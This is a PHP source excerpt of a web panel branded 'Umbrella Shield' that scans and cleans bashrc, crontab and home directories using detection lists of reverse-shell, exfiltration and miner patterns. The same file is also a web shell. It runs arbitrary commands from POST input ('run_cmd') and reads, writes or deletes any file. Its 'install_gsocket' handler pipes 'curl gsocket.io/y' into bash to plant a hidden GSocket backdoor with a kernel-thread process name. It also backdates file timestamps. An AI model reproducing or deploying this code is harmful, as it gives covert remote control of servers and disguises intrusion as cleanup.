                        if (preg_match('/^[A-Za-z0-9+\/=\-_]{20,}$/', trim($c)))
                            $type = 'gsocket_key';
                    }
                    $found[] = ['path' => $path, 'size' => $sz, 'type' => $type];
                }
            } catch (\Exception $e) {
            }
        }
        // Also scan ALL .ssh/ subdirs for ELF binaries disguised as SSH keys
        $sshDir = "$scanHome/.ssh";
        $alreadyScannedSsh = [];
        foreach ($dirs as $d) {
            if (strpos($d, '.ssh/') === 0) {
                $rp = @realpath("$scanHome/$d");
                if ($rp) $alreadyScannedSsh[] = $rp;
            }
        }
        if (is_dir($sshDir)) {
            try {
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($sshDir, RecursiveDirectoryIterator::SKIP_DOTS));
                foreach ($it as $f) {
                    if (!$f->isFile())
                        continue;
                    $path = $f->getPathname();
                    // Skip if this file is inside a directory already scanned above
                    $skipDupe = false;
                    $rpPath = @realpath($path);
                    if ($rpPath) {
                        foreach ($alreadyScannedSsh as $scanned) {
                            if ($scanned && strpos($rpPath, $scanned) === 0) {
                                $skipDupe = true;
                                break;
                            }
                        }
                    }
                    if ($skipDupe)
                        continue;
                    $sz = $f->getSize();
                    if ($sz === 0)
                        continue;
                    $hdr = @file_get_contents($path, false, null, 0, 4);
                    if ($hdr === "\x7fELF") {
                        $found[] = ['path' => $path, 'size' => $sz, 'type' => 'ELF binary (disguised in .ssh/)'];
                    } elseif ($sz <= 64 && $sz > 0) {
                        $c = @file_get_contents($path);
                        if (preg_match('/^[A-Za-z0-9+\/=\-_]{20,}$/', trim($c)))
                            $found[] = ['path' => $path, 'size' => $sz, 'type' => 'gsocket_key (in .ssh/)'];
                    }
                }
            } catch (\Exception $e) {
            }
        }
        // Scan home directory root for ELF binaries placed directly (e.g. /home/user/gs-netcat)
        try {
            $rootFiles = @scandir($scanHome);
            if ($rootFiles) {
                foreach ($rootFiles as $rf) {
                    if ($rf === '.' || $rf === '..') continue;
                    $rfPath = "$scanHome/$rf";
                    if (!is_file($rfPath)) continue;
                    $sz = @filesize($rfPath);
                    if ($sz < 50000) continue;
                    $hdr = @file_get_contents($rfPath, false, null, 0, 4);
                    if ($hdr === "\x7fELF")
                        $found[] = ['path' => $rfPath, 'size' => $sz, 'type' => 'ELF binary (home root)'];
                }
            }
        } catch (\Exception $e) {}
        // Broad catch-all: scan ALL hidden dirs under home not already covered, for ELF binaries
        $coveredTopDirs = [];
        foreach ($dirs as $d) { $coveredTopDirs[] = explode('/', $d)[0]; }
        $coveredTopDirs = array_unique(array_merge($coveredTopDirs, [
            '.ssh', '.gnupg', '.bash_history', '.bashrc', '.profile', '.bash_profile', '.bash_logout',
            '.vimrc', '.viminfo', '.gitconfig', '.git', '.nano', '.pki', '.dbus', '.gconf', '.kde',
            '.subversion', '.wget-hsts', '.lesshst', '.selected_editor', '.irssi', '.mutt',
        ]));
        try {
            $homeDirList = @scandir($scanHome);
            if ($homeDirList) {
                foreach ($homeDirList as $hd) {
                    if ($hd === '.' || $hd === '..' || $hd[0] !== '.') continue;
                    $hdPath = "$scanHome/$hd";
                    if (!is_dir($hdPath)) continue;
                    if (in_array($hd, $coveredTopDirs)) continue;
                    $it = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($hdPath, RecursiveDirectoryIterator::SKIP_DOTS)
                    );
                    $it->setMaxDepth(2);
                    foreach ($it as $f) {
                        if (!$f->isFile()) continue;
                        $sz = $f->getSize();
                        if ($sz < 50000) continue;
                        $hdr = @file_get_contents($f->getPathname(), false, null, 0, 4);
                        if ($hdr === "\x7fELF")
                            $found[] = ['path' => $f->getPathname(), 'size' => $sz, 'type' => 'ELF binary (hidden dir ' . $hd . '/)'];
                    }
                }
            }
        } catch (\Exception $e) {}
        $r['threats'] = $found;
        $r['total'] = count($found);
    } elseif ($api === 'scan_bashrc') {
        $pats = [
            // GSocket / botnet
            'exec -a', 'GS_ARGS', 'GS_PORT', 'defunct', 'SEED PRNG', 'RAVAGE', 'SHADOW OPERATOR', 'HIDDEN_SECTOR',
            'supervise', '[kdevtmpfs]', '[kcached]', '[kworker', '[raid5wq]', '[watchdogd]', '[rcu_preempt]',
            '[kstrp]', '[kcompactd', '[kswapd', '[bioset]', '[kblockd]', '[writeback]',
            // SSH backdoor
            'id_rsa', '.ppk', 'base64 -d|bash', 'base64.*|.*bash', '.dbus-session', 'sshd -fg', '/tmp/.ssh-',
            '.softaculous/htop', 'bitninjad',
            // Credential theft
            'login_check', 'MauMasuk', 'SUDO_ASKPASS', 'ASKPASS', 'BOT_TOKEN', 'CHAT_ID',
            'api.telegram.org', 'sendMessage', 'SUDO LOGGER', 'password for', '/usr/bin/sudo', 'setsid',
            'curl.*telegram', 'sudo()', 'function sudo', 'whoami 2>', 'passwd_stealer', 'cred_harvest',
            'keylog', 'discord.com/api/webhooks', 'hooks.slack.com',
            // Shell lock / attacker brands
            'SCARLYNX', 'scarlynx', 'scar-lynx', 'kurtlar', 's4ndal', 'DrunkShell', 'panox1',
            'RanksatAdmin', 'KEMBANGTOTO', 'msfacai',
            // Shell lock patterns (password gate, trap, banner)
            'expected_hash', 'input_hash', 'input_pass', 'Akses diterima', 'Coba Pikir',
            'Masukkan Password', 'sha256sum', 'in your area', 'shell lock', 'Lebih Keras',
            'Selamat datang', 'di Neraka', 'Welcome to', 'LOCKED', 'ACCESS DENIED',
            // Trap signals (shell lock blocks Ctrl+C/Ctrl+Z)
            'trap - INT', 'trap "" INT', 'trap "" TSTP', 'trap "" QUIT', 'trap "" HUP',
            'SIGTSTP', 'SIGQUIT',
            // Reverse shell in bashrc
            'fsockopen', 'nc -e', 'ncat -e', 'socat', '/dev/tcp/', 'mkfifo',
            // Crypto miner
            'xmrig', 'stratum+tcp', 'minergate', 'cryptonight',
        ];
        $profileFiles = ['.bashrc', '.profile', '.bash_profile', '.bash_login'];
        $found = [];
        $allContents = [];
        foreach ($profileFiles as $pf) {
            $fp = "$home/$pf";
            if (!file_exists($fp))
                continue;
            $c = file_get_contents($fp);
            $allContents[$pf] = $c;
            foreach ($pats as $p) {
                if (stripos($c, $p) !== false)
                    $found[] = "$pf: $p";
            }
        }
        $r['poisoned'] = count($found) > 0;
        $r['patterns'] = $found;
        $r['files_checked'] = $profileFiles;
        $r['content'] = $allContents ?: '(no profile files found)';
        $r['home'] = $home;
        // Check immutable lock status via PHP (no shell needed)
        $bashrcPath = "$home/.bashrc";
        $r['locked'] = file_exists($bashrcPath) && !is_writable($bashrcPath);
    } elseif ($api === 'clean_bashrc') {
        $profileFiles = ['.bashrc', '.profile', '.bash_profile', '.bash_login'];
        $cleaned = [];
        $defaultBashrc = "# ~/.bashrc - Cleaned by Umbrella Shield " . date('Y-m-d H:i:s') . "\n\n# Source global definitions\nif [ -f /etc/bashrc ]; then\n    . /etc/bashrc\nfi\n\n# User specific environment\nif ! [[ \"\$PATH\" =~ \"\$HOME/.local/bin:\$HOME/bin:\" ]]; then\n    PATH=\"\$HOME/.local/bin:\$HOME/bin:\$PATH\"\nfi\nexport PATH\n";
        $defaultProfile = "# ~/.profile - Cleaned by Umbrella Shield " . date('Y-m-d H:i:s') . "\n\nif [ -n \"\$BASH_VERSION\" ]; then\n    if [ -f \"\$HOME/.bashrc\" ]; then\n        . \"\$HOME/.bashrc\"\n    fi\nfi\n";
        foreach ($profileFiles as $pf) {
            $fp = "$home/$pf";
            if (!file_exists($fp))
                continue;
            xcmd("chattr -i " . escapeshellarg($fp) . " 2>/dev/null");
            @chmod($fp, 0644);
            $oldContent = @file_get_contents($fp);
            $default = ($pf === '.bashrc') ? $defaultBashrc : $defaultProfile;
            @file_put_contents($fp, $default);
            @chmod($fp, 0644);
            xcmd("touch -r /etc/passwd " . escapeshellarg($fp) . " 2>/dev/null");
            $cleaned[$pf] = strlen($oldContent);
        }
        $r['ok'] = true;
        $r['cleaned_files'] = $cleaned;
        $r['message'] = empty($cleaned) ? 'No profile files found' : 'Replaced ' . count($cleaned) . ' files with clean default';

    } elseif ($api === 'lock_bashrc') {
        $profileFiles = ['.bashrc', '.profile', '.bash_profile', '.bash_login'];
        $locked = []; $failed = [];
        foreach ($profileFiles as $pf) {
            $fp = "$home/$pf";
            if (!file_exists($fp)) continue;
            xcmd("chattr +i " . escapeshellarg($fp) . " 2>/dev/null");
            @chmod($fp, 0444);
            $locked[] = $pf;
        }
        $r['ok'] = true;
        $r['locked'] = $locked;
        $r['message'] = empty($locked) ? 'No files to lock' : 'Locked: ' . implode(', ', $locked);

    } elseif ($api === 'unlock_bashrc') {
        $profileFiles = ['.bashrc', '.profile', '.bash_profile', '.bash_login'];
        $unlocked = [];
        foreach ($profileFiles as $pf) {
            $fp = "$home/$pf";
            if (!file_exists($fp)) continue;
            xcmd("chattr -i " . escapeshellarg($fp) . " 2>/dev/null");
            @chmod($fp, 0644);
            $unlocked[] = $pf;
        }
        $r['ok'] = true;
        $r['unlocked'] = $unlocked;
        $r['message'] = empty($unlocked) ? 'No files found' : 'Unlocked: ' . implode(', ', $unlocked);

    } elseif ($api === 'scan_crontab') {
        $malPats = [
            // GSocket / botnet persistence
            'defunct',
            'gs-netcat',
            'gs-dbus',
            'gsocket',
            'GS_ARGS',
            '1b5b324a',
            'seed prng',
            'SEED PRNG',
            'watchdog\.sh',
            'kdevtmpfs',
            'kcached',
            '\.config/htop',
            '\.softaculous/htop',
            '\.softaculous',
            '\.ssh/putty',
            'rcu_preempt',
            'kstrp',
            'kcompactd',
            'kblockd',
            'writeback',
            'bioset',
            'id_rsa.*liqD',
            '\.config/Thunar',
            '\.defunct\.cfg',
            // Hidden SSH backdoor persistence (openssh from /tmp)
            '\.dbus-session',
            '/tmp/\.ssh-\d+',
            '/tmp/.*sshd\b',
            '/dev/shm/.*sshd',
            '\.dbus-session/sshd',
            'sshd\s+-fg\s+>',
            // Reverse shell persistence
            'nc\s+-[elp]',
            'ncat\s+-[elp]',
            'socat\s+.*exec',
            'mkfifo.*nc\b',
            // PHP-based self-healing shell persistence
            'php\s+-r.*base64_decode',
            'php\s+-r.*file_put_contents',
            'file_put_contents.*base64_decode',
            'base64_decode.*file_put_contents',
            'file_exists.*file_put_contents',
            // Shell download + execute via cron
            'curl.*\|.*(?:bash|sh|php)',
            'wget.*-O.*\.php',
            'wget.*\|.*(?:bash|sh)',
            // base64 decode piped to shell
            'base64.*bash',
            'bash.*base64',
            'echo.*base64.*\|.*bash',
            // Python/perl one-liner backdoor
            'python.*-c.*socket',
            'perl.*-e.*socket',
            // Cleanup/hide traces in cron
            'chmod.*777.*\.php',
            'chmod.*\+x.*\.(sh|py|pl)',
        ];
        // Baca crontab via exec
        $raw = xcmd('crontab -l 2>/dev/null');
        // Fallback jika exec disabled: baca file crontab langsung
        if (empty(trim($raw))) {
            $cronPaths = [
                '/var/spool/cron/crontabs/' . $user,
                '/var/spool/cron/' . $user,
            ];
            foreach ($cronPaths as $cp) {
                if (@file_exists($cp) && @is_readable($cp)) {
                    $raw = @file_get_contents($cp);
                    $r['cron_source'] = $cp;
                    break;
                }
            }
        }
        $lines = explode("\n", $raw ?: '');
        $malicious = [];
        // Patterns that are malicious EVEN inside comments (GSocket markers + SSH backdoor)
        $commentMalPats = ['SEED PRNG', 'defunct', 'GS_ARGS', 'gs-netcat', 'gs-dbus', 'gsocket', '1b5b324a', '\.config/htop', '\.softaculous/htop', '\.softaculous', '\.ssh/putty', '\.dbus-session', '/tmp/\.ssh-\d+', '/tmp/.*sshd'];
        foreach ($lines as $i => $line) {
            $trimmed = trim($line);
            if (empty($trimmed))
                continue;
            if ($trimmed[0] === '#') {
                // Check comments for high-confidence GSocket markers
                foreach ($commentMalPats as $p) {
                    if (@preg_match('~' . $p . '~i', $line)) {
                        $malicious[] = ['line' => $i + 1, 'content' => $line, 'pattern' => $p . ' (in comment)'];
                        break;
                    }
                }
                continue;
            }
            foreach ($malPats as $p) {
                if (@preg_match('~' . $p . '~i', $line)) {
                    $malicious[] = ['line' => $i + 1, 'content' => $line, 'pattern' => $p];
                    break;
                }
            }
        }
        $r['raw'] = $raw ?: '(empty or not accessible)';
        $r['malicious'] = $malicious;
        $r['threat_count'] = count($malicious);
        $r['total_lines'] = count($lines);

    } elseif ($api === 'clean_crontab') {
        $malPats = [
            // GSocket / botnet persistence
            'defunct',
            'gs-netcat',
            'gs-dbus',
            'gsocket',
            'GS_ARGS',
            '1b5b324a',
            'seed prng',
            'SEED PRNG',
            'watchdog\.sh',
            'kdevtmpfs',
            'kcached',
            '\.config/htop',
            '\.softaculous/htop',
            '\.softaculous',
            '\.ssh/putty',
            'rcu_preempt',
            'kstrp',
            'kcompactd',
            'kblockd',
            'writeback',
            'bioset',
            'id_rsa.*liqD',
            '\.config/Thunar',
            '\.defunct\.cfg',
            // Hidden SSH backdoor persistence (openssh from /tmp)
            '\.dbus-session',
            '/tmp/\.ssh-\d+',
            '/tmp/.*sshd\b',
            '/dev/shm/.*sshd',
            '\.dbus-session/sshd',
            'sshd\s+-fg\s+>',
            // Reverse shell persistence
            'nc\s+-[elp]',
            'ncat\s+-[elp]',
            'socat\s+.*exec',
            'mkfifo.*nc\b',
            // PHP-based self-healing shell persistence
            'php\s+-r.*base64_decode',
            'php\s+-r.*file_put_contents',
            'file_put_contents.*base64_decode',
            'base64_decode.*file_put_contents',
            'file_exists.*file_put_contents',
            // Shell download + execute
            'curl.*\|.*(?:bash|sh|php)',
            'wget.*-O.*\.php',
            'wget.*\|.*(?:bash|sh)',
            // base64 piped to shell
            'base64.*bash',
            'bash.*base64',
            'echo.*base64.*\|.*bash',
            // Python/perl backdoor
            'python.*-c.*socket',
            'perl.*-e.*socket',
            'chmod.*777.*\.php',
            'chmod.*\+x.*\.(sh|py|pl)',
        ];
        $raw = xcmd('crontab -l 2>/dev/null');
        $cronSource = null;
        if (empty(trim($raw))) {
            $cronPaths = ['/var/spool/cron/crontabs/' . $user, '/var/spool/cron/' . $user];
            foreach ($cronPaths as $cp) {
                if (@file_exists($cp) && @is_readable($cp)) {
                    $raw = @file_get_contents($cp);
                    $cronSource = $cp;
                    break;
                }
            }
        }
        $lines = explode("\n", $raw ?: '');
        $kept = [];
        $removed = 0;
        $commentMalPats = ['SEED PRNG', 'defunct', 'GS_ARGS', 'gs-netcat', 'gs-dbus', 'gsocket', '1b5b324a', '\.config/htop', '\.softaculous/htop', '\.softaculous', '\.ssh/putty', '\.dbus-session', '/tmp/\.ssh-\d+', '/tmp/.*sshd'];
        foreach ($lines as $line) {
            $trimmed = trim($line);
            $drop = false;
            if (!empty($trimmed)) {
                if ($trimmed[0] === '#') {
                    foreach ($commentMalPats as $p) {
                        if (@preg_match('/' . $p . '/i', $line)) {
                            $drop = true;
                            break;
                        }
                    }
                } else {
                    foreach ($malPats as $p) {
                        if (@preg_match('/' . $p . '/i', $line)) {
                            $drop = true;
                            break;
                        }
                    }
                }
            }
            if ($drop)
                $removed++;
            else
                $kept[] = $line;
        }
        $cleaned = implode("\n", $kept);
        $tmpFile = '/tmp/.cr_' . getmypid();
        @file_put_contents($tmpFile, $cleaned);
        // A successful crontab install is normally silent; append a sentinel so
        // success is distinguishable from xcmd() being unavailable.
        $out = xcmd("crontab " . escapeshellarg($tmpFile) . " 2>&1 && printf CRON_WRITE_OK");
        @unlink($tmpFile);
        // When all PHP command executors are disabled, xcmd() returns an empty
        // string.  In that case the old condition never reached this fallback.
        // Write only the same spool file we successfully read, never guess/create
        // a system crontab path.  A host cron daemon may still require its own
        // ownership/mode rules, so report this method honestly to the UI.
        $commandWorked = strpos($out, 'CRON_WRITE_OK') !== false;
        $directWrite = false;
        if (!$commandWorked && $cronSource && @is_writable($cronSource)) {
            $originalMode = @fileperms($cronSource);
            $written = @file_put_contents($cronSource, $cleaned, LOCK_EX);
            if ($written !== false) {
                if ($originalMode !== false)
                    @chmod($cronSource, $originalMode & 0777);
                $directWrite = true;
            }
        }
        $r['removed'] = $removed;
        $r['remaining'] = count($kept);
        $r['method'] = $directWrite ? 'direct_spool_write' : ($commandWorked ? 'crontab_cmd' : 'not_written');
        $r['cron_source'] = $cronSource;
        $r['ok'] = $removed === 0 || $directWrite || $commandWorked;
        $r['warning'] = !$r['ok']
            ? 'Cron entries were detected but could not be updated: the crontab command and writable spool fallback are unavailable.'
            : (!$commandWorked && $directWrite
                ? 'Entries were removed by direct spool write. Re-check after one cron cycle; host ownership rules can vary.'
                : null);

    } elseif ($api === 'exec_caps') {
        // Deteksi exec capability — penting untuk hosting yang disable exec
        $fns = ['proc_open', 'shell_exec', 'popen', 'passthru', 'exec', 'system', 'pcntl_exec'];
        $disabled_str = strtolower(ini_get('disable_functions') . ',' . ini_get('suhosin.executor.func.blacklist'));
        $available = [];
        $blocked = [];
        foreach ($fns as $fn) {
            if (function_exists($fn) && strpos($disabled_str, $fn) === false)
                $available[] = $fn;
            else
                $blocked[] = $fn;
        }
        // Test apakah benar-benar bisa jalan
        $testOut = xcmd('echo EXEC_OK 2>/dev/null');
        $r['exec_works'] = trim($testOut) === 'EXEC_OK';
        $r['available'] = $available;
        $r['blocked'] = $blocked;
        $r['php_read'] = function_exists('file_get_contents');
        $r['php_write'] = function_exists('file_put_contents');
        $r['php_delete'] = function_exists('unlink');
        $r['php_scan'] = class_exists('RecursiveIteratorIterator');
        $r['posix_kill'] = function_exists('posix_kill');
        $r['disabled_fns'] = ini_get('disable_functions') ?: 'none';
        $r['note'] = $r['exec_works']
            ? 'Full shell access available'
            : ($r['php_read'] ? 'exec disabled — file scan/edit/delete still works via PHP native' : 'Severely restricted environment');

    } elseif ($api === 'remove_file') {
        $fp = $_POST['path'] ?? '';
        if ($fp && file_exists($fp)) {
            $r['path'] = $fp;
            // Method 1: PHP unlink
            $r['ok'] = @unlink($fp);
            $r['method'] = 'unlink';
            // Method 2: Shell rm -f (works when PHP unlink fails)
            if (file_exists($fp)) {
                xcmd("rm -f " . escapeshellarg($fp) . " 2>/dev/null");
                if (!file_exists($fp)) { $r['ok'] = true; $r['method'] = 'shell_rm'; }
            }
            // Method 3: chattr -i then rm (immutable flag removal)
            if (file_exists($fp)) {
                xcmd("chattr -i " . escapeshellarg($fp) . " 2>/dev/null; rm -f " . escapeshellarg($fp) . " 2>/dev/null");
                if (!file_exists($fp)) { $r['ok'] = true; $r['method'] = 'chattr_rm'; }
            }
            // Method 4: Truncate + overwrite (last resort — can't delete but can neutralize)
            if (file_exists($fp)) {
                xcmd("truncate -s 0 " . escapeshellarg($fp) . " 2>/dev/null");
                @file_put_contents($fp, "<?php //killed by Umbrella Shield - " . date('Y-m-d H:i:s') . "\n");
                $sz = @filesize($fp);
                if ($sz !== false && $sz < 100) { $r['ok'] = true; $r['method'] = 'overwrite'; }
            }
            // Method 5: Shell overwrite with echo (when PHP file_put_contents fails)
            if (file_exists($fp) && @filesize($fp) > 100) {
                xcmd("echo '<?php //killed' > " . escapeshellarg($fp) . " 2>/dev/null");
                $sz = @filesize($fp);
                if ($sz !== false && $sz < 100) { $r['ok'] = true; $r['method'] = 'shell_overwrite'; }
            }
            if (!$r['ok']) {
                $r['error'] = 'All delete methods failed. Owner: ' . @posix_getpwuid(@fileowner($fp))['name'] . ', perms: ' . substr(sprintf('%o', @fileperms($fp)), -4);
            }
        } else {
            $r['ok'] = false;
            $r['error'] = $fp ? 'File not found' : 'No path provided';
        }
    } elseif ($api === 'whitelist_list') {
        $wlFile = __DIR__ . '/.shield_whitelist.json';
        $wl = file_exists($wlFile) ? json_decode(@file_get_contents($wlFile), true) : [];
        if (!is_array($wl)) $wl = [];
        $r['whitelist'] = $wl;
        $r['count'] = count($wl);
    } elseif ($api === 'whitelist_add') {
        $wlFile = __DIR__ . '/.shield_whitelist.json';
        $wl = file_exists($wlFile) ? json_decode(@file_get_contents($wlFile), true) : [];
        if (!is_array($wl)) $wl = [];
        $path = trim($_POST['path'] ?? '');
        $sig = trim($_POST['sig'] ?? '');
        $mode = trim($_POST['mode'] ?? 'path');
        $pinSize = isset($_POST['size']) ? intval($_POST['size']) : 0;
        if (!$path && !$sig) {
            $r['ok'] = false; $r['error'] = 'No path or signature provided';
        } else {
            $entry = ['added' => date('Y-m-d H:i:s')];
            if ($mode === 'sig' && $sig) {
                $entry['type'] = 'sig';
                $entry['sig'] = $sig;
                $entry['key'] = 'sig:' . $sig;
            } elseif ($mode === 'dir' && $path) {
                $entry['type'] = 'dir';
                $entry['dir'] = rtrim(str_replace('\\', '/', $path), '/');
                $entry['key'] = 'dir:' . $entry['dir'];
            } else {
                $entry['type'] = 'path';
                $entry['path'] = str_replace('\\', '/', $path);
                $entry['key'] = 'path:' . $entry['path'];
            }
            if ($sig && $mode !== 'sig') $entry['sig'] = $sig;
            if ($pinSize > 0) $entry['size'] = $pinSize;
            $exists = false;
            foreach ($wl as $w) { if (($w['key'] ?? '') === $entry['key']) { $exists = true; break; } }
            if ($exists) {
                $r['ok'] = true; $r['message'] = 'Already whitelisted';
            } else {
                $wl[] = $entry;
                @file_put_contents($wlFile, json_encode($wl, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
                @chmod($wlFile, 0600);
                $r['ok'] = true; $r['entry'] = $entry; $r['count'] = count($wl);
            }
        }
    } elseif ($api === 'whitelist_remove') {
        $wlFile = __DIR__ . '/.shield_whitelist.json';
        $wl = file_exists($wlFile) ? json_decode(@file_get_contents($wlFile), true) : [];
        if (!is_array($wl)) $wl = [];
        $key = trim($_POST['key'] ?? '');
        if (!$key) { $r['ok'] = false; $r['error'] = 'No key provided'; }
        else {
            $wl = array_values(array_filter($wl, function($w) use ($key) { return ($w['key'] ?? '') !== $key; }));
            @file_put_contents($wlFile, json_encode($wl, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
            $r['ok'] = true; $r['count'] = count($wl);
        }
    } elseif ($api === 'rename_file') {
        $fp = $_POST['path'] ?? '';
        $newName = $_POST['new_name'] ?? '';
        if ($fp && file_exists($fp) && $newName) {
            $dir = dirname($fp);
            $newPath = $dir . '/' . basename($newName);
            if (file_exists($newPath)) {
                $r['ok'] = false;
                $r['error'] = 'Target already exists: ' . basename($newPath);
            } else {
                $r['ok'] = @rename($fp, $newPath);
                $r['old_path'] = $fp;
                $r['new_path'] = $newPath;
                if (!$r['ok']) $r['error'] = 'Rename failed — check permissions';
            }
        } else {
            $r['ok'] = false;
            $r['error'] = !$fp ? 'No path' : (!$newName ? 'No new name' : 'File not found');
        }
    } elseif ($api === 'read_file') {
        $fp = $_POST['path'] ?? '';
        if ($fp && file_exists($fp) && is_file($fp)) {
            $sz = filesize($fp);
            // PHAR detection
            $hdr = @file_get_contents($fp, false, null, 0, 4);
            $isPhar = ($hdr && (substr($hdr, 0, 4) === "\x00\x00" || strpos(@file_get_contents($fp, false, null, 0, 100), '__HALT_COMPILER') !== false));
            if (!$isPhar) {
                $isPhar = (pathinfo($fp, PATHINFO_EXTENSION) === 'phar');
            }
            // Also check stub
            $firstBytes = @file_get_contents($fp, false, null, 0, 500);
            if ($firstBytes && preg_match('/__HALT_COMPILER\s*\(\s*\)\s*;/', $firstBytes))
                $isPhar = true;
            if ($firstBytes && preg_match('/^\s*<\?php.*\\\\x[0-9a-f]{2}.*__HALT_COMPILER/si', $firstBytes))
                $isPhar = true;
            if ($isPhar) {
                $r['content'] = "[PHAR Archive - Binary file]\n\nSize: " . number_format($sz) . " bytes\nPath: $fp\nModified: " . date('Y-m-d H:i:s', filemtime($fp)) . "\n\n";
                $r['is_phar'] = true;
                $r['size'] = $sz;
                $r['path'] = $fp;
                $r['mod'] = date('Y-m-d H:i:s', filemtime($fp));
                // Try to read PHAR stub (the PHP code before __HALT_COMPILER)
                $raw = @file_get_contents($fp);
                $haltPos = strpos($raw, '__HALT_COMPILER');
                if ($haltPos !== false) {
                    $stub = substr($raw, 0, $haltPos + 20);
                    if (mb_check_encoding($stub, 'UTF-8')) {
                        $r['content'] .= "--- PHAR Stub (loader code) ---\n" . $stub . "\n\n--- Binary payload follows ---";
                    } else {
                        $r['content'] .= "--- PHAR Stub contains binary/obfuscated data ---";
                    }
                }
                $r['suspicious_lines'] = [];
            } elseif ($sz <= 512 * 1024) {
                $content = file_get_contents($fp);
                if (!mb_check_encoding($content, 'UTF-8')) {
                    $content = mb_convert_encoding($content, 'UTF-8', 'ISO-8859-1');
                }
                $r['content'] = $content;
                $r['size'] = $sz;
                $r['path'] = $fp;
                $r['mod'] = date('Y-m-d H:i:s', filemtime($fp));
                // Per-line injection detection
                $linePatterns = [
                    'eval_base64' => '/eval\s*\(\s*base64_decode/i',
                    'eval_gzinflate' => '/eval\s*\(\s*gzinflate/i',
                    'eval_str_rot' => '/eval\s*\(\s*str_rot13/i',
                    'remote_fetch' => '/file_get_contents\s*\([\'"](https?|ftp):\/\//i',
                    'system_rce' => '/\b(system|passthru|shell_exec|exec)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i',
                    'script_inject' => '/<script[^>]+src\s*=\s*[\'"]https?:\/\//i',
                    'add_action_ext' => '/add_action\s*\([\'"]wp_head[\'"]/',
                    'suspicious_inc' => '/@include\s*\$|@require\s*\$/i',
                    'hex_obfusc' => '/\\\\x[0-9a-f]{2}\\\\x[0-9a-f]{2}\\\\x[0-9a-f]{2}/i',
                    'c2_domain' => '/kaye1337|5gvci|qris-pwn|pages\.dev\/stfu/i',
                    'cookie_trigger' => '/\$_COOKIE\[.*\].*eval|eval.*\$_COOKIE/i',
                    'tmpfile_loader' => '/tmpfile\s*\(\s*\)/i',
                    'preg_replace_e' => '/preg_replace\s*\(.*\/e[\'"\s,]/i',
                    'base85_xor' => '/function\s+_n\s*\(\$s.*function\s+_x\s*\(\$d/si',
                    'rot13_func' => '/str_rot13\s*\(\s*[\'"](tmhapbzcerff|flf_trg_grzc_qve|grzcanz)/i',
                    'ranksat_ioc' => '/RanksatAdmin|prabowoasw99|prabowomemek/i',
                ];
                $suspicious = [];
                $fileLines = explode("\n", $content);
                foreach ($fileLines as $idx => $line) {
                    foreach ($linePatterns as $pName => $pattern) {
                        if (@preg_match($pattern, $line)) {
                            $suspicious[] = [
                                'line' => $idx + 1,
                                'pattern' => $pName,
                                'snippet' => substr(trim($line), 0, 150),
                            ];
                            break;
                        }
                    }
                }
                $r['suspicious_lines'] = $suspicious;
            } else {
                $r['ok'] = false;
                $r['error'] = 'File too large (>' . round($sz / 1024) . 'KB)';
            }
        } else {
            $r['ok'] = false;
            $r['error'] = 'File not found: ' . htmlspecialchars($fp);
        }
    } elseif ($api === 'save_file') {
        $fp = $_POST['path'] ?? '';
        $content = $_POST['content'] ?? '';
        if ($fp && file_exists($fp) && is_file($fp)) {
            $written = file_put_contents($fp, $content);
            $r['ok'] = $written !== false;
            $r['path'] = $fp;
            $r['size'] = $written;
            if (!$r['ok'])
                $r['error'] = 'Write failed — check permissions';
        } else {
            $r['ok'] = false;
            $r['error'] = 'File not found: ' . htmlspecialchars($fp);
        }
    } elseif ($api === 'run_cmd') {
        $cmd = $_POST['cmd'] ?? '';
        if ($cmd)
            $r['output'] = xcmd($cmd);
    } elseif ($api === 'server_info') {
        $df = @disk_free_space($home);
        $dt = @disk_total_space($home);
        $r['info'] = ['hostname' => gethostname(), 'os' => php_uname(), 'user' => $user . ' (' . getmyuid() . ')', 'php' => phpversion(), 'server' => $_SERVER['SERVER_SOFTWARE'] ?? '', 'ip' => $_SERVER['SERVER_ADDR'] ?? '', 'remote' => $_SERVER['REMOTE_ADDR'] ?? '', 'home' => $home, 'disk_free' => $df ? round($df / 1073741824, 1) . 'G' : '?', 'disk_total' => $dt ? round($dt / 1073741824, 1) . 'G' : '?', 'memory' => ini_get('memory_limit'), 'disabled' => ini_get('disable_functions') ?: 'NONE'];
    } elseif ($api === 'install_gsocket') {
        $secret = $_POST['secret'] ?? '';
        $port = $_POST['port'] ?? '443';
        $hiddenName = $_POST['hidden_name'] ?? '[kcached]';
        if (strlen($secret) < 8) {
            $r['ok'] = false;
            $r['error'] = 'Secret too short (min 8 chars)';
            echo json_encode($r);
            exit;
        }
        $binDir = "$home/.config/htop";
        @mkdir($binDir, 0700, true);
        $binName = 'defunct';
        $binPath = "$binDir/$binName";
        $secFile = "$binDir/.defunct.dat";
        $steps = [];
        $gsrnOk = false;
        $arch = trim(xcmd('uname -m')) ?: 'x86_64';
        $archKey = (strpos($arch, 'aarch64') !== false || strpos($arch, 'arm') !== false) ? 'aarch64' : 'x86_64';
        $steps[] = "Arch: $arch | Port: $port | Hidden: $hiddenName";

        $steps[] = 'Cleaning up old installations...';
        xcmd("pkill -9 -f gs-dbus 2>/dev/null; pkill -9 -f gs-netcat 2>/dev/null; pkill -9 -f defunct.dat 2>/dev/null; sleep 1");
        xcmd("cd " . escapeshellarg($binDir) . " 2>/dev/null && rm -f .defunct.dat .defunct.cfg defunct.dat defunct gs-dbus gs-netcat 2>/dev/null");
        // Clean old gsocket installer secrets ([kcached].dat, [writeback].dat, etc)
        xcmd("find " . escapeshellarg($binDir) . " -maxdepth 1 -name '*.dat' -size -100c -delete 2>/dev/null");
        xcmd("find " . escapeshellarg($binDir) . " -maxdepth 1 -name '\\[*\\].dat' -delete 2>/dev/null");
        xcmd("rm -rf " . escapeshellarg($binDir) . "/.gs-* " . escapeshellarg($binDir) . "/.gsusr-* 2>/dev/null");

        // METHOD 1
        $steps[] = 'Method 1: Official installer (gsocket.io/y)...';
        $cmd1 = "cd " . escapeshellarg($home) . " 2>/dev/null; unset TMPDIR; export HOME=" . escapeshellarg($home) . "; X=" . escapeshellarg($secret) . " GS_PORT=$port GS_HIDDEN_NAME=" . escapeshellarg($hiddenName) . " GS_NOCERTCHECK=1 bash -c \"\$(curl -fsSL gsocket.io/y)\" 2>&1";
        $out1 = xcmd($cmd1);
        $steps[] = 'Installer output: ' . substr($out1, 0, 400);
        sleep(2);
